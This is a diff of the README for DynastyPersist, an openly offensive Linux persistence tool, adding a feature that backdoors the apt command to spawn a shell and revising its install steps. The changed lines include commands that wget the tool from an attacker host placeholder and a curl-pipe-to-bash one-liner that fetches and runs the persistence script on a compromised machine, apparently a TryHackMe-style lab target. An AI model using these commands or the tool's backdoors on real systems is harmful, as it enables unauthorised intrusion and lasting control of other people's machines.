@@ -31,6 +31,8 @@
 
 10. **Modify an Existing Systemd Service:** Manipulates an existing systemd service for persistence.
 
+11. **Backdoors APT Command:** Backdoors `apt` command to pop up a shell. 
+
 
 ## Installation
 
@@ -40,18 +42,18 @@
 $ git clone https://github.com/Trevohack/DynastyPersist.git
 
 $ python3 -m http.server 8080 
-root@tyler.thm # cd /opt && wget -c [ATTACKER-IP]:8080/DynastyPersist && cd DynastyPersist && chmod +x dynasty.sh && ./dynasty.sh
+root@tyler.thm~$ cd /opt && wget -c [ATTACKER-IP]:8080/DynastyPersist && cd DynastyPersist && chmod +x dynasty.sh && ./dynasty.sh <ATTACKER_IP> <PORT>
 ``` 
 
 2. One linear
    
 ```bash
-curl -sSL [ATTACKER-IP]8080/DynastyPersist/dynasty.sh | bash
+curl -sSL [ATTACKER_IP]:8080/DynastyPersist/dynasty.sh <ATTACKER_IP> <PORT> | bash
 ``` 
 
 ## Support
 
-For support, email spaceshuttle.io.all@gmail.com or join our Discord server. 
+For support, email `spaceshuttle.io.all@gmail.com` or join our Discord server. 
 
 * Discord: `https://discord.gg/WYzu65Hp`
 
